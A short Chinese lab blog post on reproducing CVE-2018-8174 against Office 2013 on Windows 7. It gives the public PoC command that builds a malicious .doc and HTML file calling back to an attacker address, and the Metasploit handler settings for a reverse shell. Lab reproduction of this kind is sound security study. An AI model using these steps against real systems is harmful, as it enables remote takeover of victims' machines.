# CVE-2018-8174的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745394&idx=1&sn=18b3087c066cdb7ff8b3bef983b2b108&chksm=87148b32b06302249ee77a076f1469350f3201ad6073c369f89c311eaab7bf736e527bfe6759&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745394&idx=1&sn=18b3087c066cdb7ff8b3bef983b2b108&chksm=87148b32b06302249ee77a076f1469350f3201ad6073c369f89c311eaab7bf736e527bfe6759&scene=27#wechat_redirect)

上两周实践了CVE-2017-11882，说来也巧，紧跟着就有安全公司的研究人员声称在金融行业发现了利用这个漏洞攻击的恶意软件，毕竟我的blog在先，算是神配合吧，  

本周继续，再整一个重量级的，CVE-2018-8174，

我参考的是，https://github.com/0x09AL/CVE-2018-8174-msf，

老规矩，靶机环境还是Win7 SP1 X64 + Office2013，

metasploit的安装就不说了，

还是把POC作者写的py文件拷贝到metasploit环境里，

sudo vim CVE-2018-8174.py，

生成木马文件，python CVE-2018-8174.py -u http://192.168.137.71/exploit.html -o exp.doc -i 192.168.137.71 -p 4444，

木马文件有两个，一个是html文件，另一个是doc文件，  

html文件拷贝到metasploit的/var/www/html文件夹里，

当然metasploit需要把apache服务打开，这个就不细说了，

doc文件拷贝到靶机里，

metasploit这边开一个handler等着反弹shell，

use exploit/multi/handler  
set payload windows/shell/reverse\_tcp  
set lhost 192.168.137.71  
set lport 4444  
run

同样的验证方法在Win10 X64 + Office2013的环境里无效，算是让我安心了，因为我到现在还没抽出空重装系统，  

跟我上一篇blog中说的一样，我的笔记本电脑环境还是不能实时防护发现这个doc后门文件，而win10自带的defender确实还是有反应的，
